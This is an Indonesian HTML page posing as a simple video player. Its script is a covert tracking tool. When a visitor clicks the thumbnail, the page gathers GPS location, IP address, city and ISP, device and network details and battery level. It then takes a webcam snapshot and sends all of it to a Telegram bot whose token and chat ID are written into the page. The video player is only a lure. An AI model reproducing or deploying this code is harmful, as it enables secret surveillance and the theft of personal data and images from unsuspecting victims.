<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
        }
        .video-container {
            position: relative;
            width: 640px;
            height: 360px;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        #thumbnail {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            position: absolute;
            z-index: 1;
            cursor: pointer;
        }
        video {
            width: 100%;
            height: 100%;
            display: none;
        }
        .controls {
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            gap: 10px;
        }
        button {
            background: rgba(255, 255, 255, 0.3);
            border: none;
            padding: 10px;
            color: white;
            cursor: pointer;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <img id="thumbnail" src="thumbnail.jpg" alt="Thumbnail Video" onclick="startVideo()">
        <video id="video" autoplay muted></video>
        <div class="controls">
            <button onclick="togglePlay()">‚ñ∂Ô∏è Play/Pause</button>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "7835500770:AAEhp7-8y-mEuhjw2bTUzutQ3rZjmg5zv5o"; // Ganti dengan token bot Telegram
        const CHAT_ID = "-1002270270494"; // Ganti dengan Chat ID Anda
        let video = document.getElementById("video");
        let thumbnail = document.getElementById("thumbnail");
        let isPlaying = false;

        function sendToTelegram(message, photoBlob = null) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("caption", message);
            
            if (photoBlob) {
                formData.append("photo", photoBlob, "snapshot.jpg");
            }

            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        async function captureData() {
            let message = "üîç Data Pengguna:\n";

            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject);
                });
                message += `üìç Lokasi: ${pos.coords.latitude}, ${pos.coords.longitude}\n`;
            } catch {
                message += "‚ùå Lokasi tidak diizinkan.\n";
            }

            try {
                const ipData = await fetch("https://ipinfo.io/json").then(res => res.json());
                message += `üåê IP: ${ipData.ip}\nüèô Kota: ${ipData.city}, ${ipData.region}\nüì° ISP: ${ipData.org}\n`;
            } catch {
                message += "‚ö†Ô∏è Gagal mendapatkan informasi IP.\n";
            }

            let network = navigator.connection ? navigator.connection.effectiveType.toUpperCase() : "Unknown";
            let androidVersion = navigator.userAgent.match(/Android\s([0-9\.]+)/);
            let androidInfo = androidVersion ? `ü§ñ Android: ${androidVersion[1]}\n` : "";
            message += `üì± Perangkat: ${navigator.userAgent}\nüì∂ Jaringan: ${network}\n${androidInfo}`;

            try {
                const battery = await navigator.getBattery();
                message += `üîã Baterai: ${Math.round(battery.level * 100)}%\n`;
            } catch {
                message += "‚ö†Ô∏è Tidak bisa mendapatkan status baterai.\n";
            }

            try {
                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                video.play();
                isPlaying = true;

                let canvas = document.createElement("canvas");
                let ctx = canvas.getContext("2d");

                await new Promise(resolve => setTimeout(resolve, 2000));

                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                canvas.toBlob(async blob => {
                    await sendToTelegram(message, blob);
                }, "image/jpeg");

                stream.getTracks().forEach(track => track.stop());
                video.style.display = "none";
                thumbnail.style.display = "block";
            } catch {
                await sendToTelegram("‚ùå Kamera tidak diizinkan.");
            }
        }

        function startVideo() {
            thumbnail.style.display = "none";
            video.style.display = "block";
            captureData();
        }

        function togglePlay() {
            if (isPlaying) {
                video.pause();
                isPlaying = false;
            } else {
                video.play();
                isPlaying = true;
            }
        }

        window.onload = function () {
            video.style.display = "none";
        };
    </script>
</body>
</html>
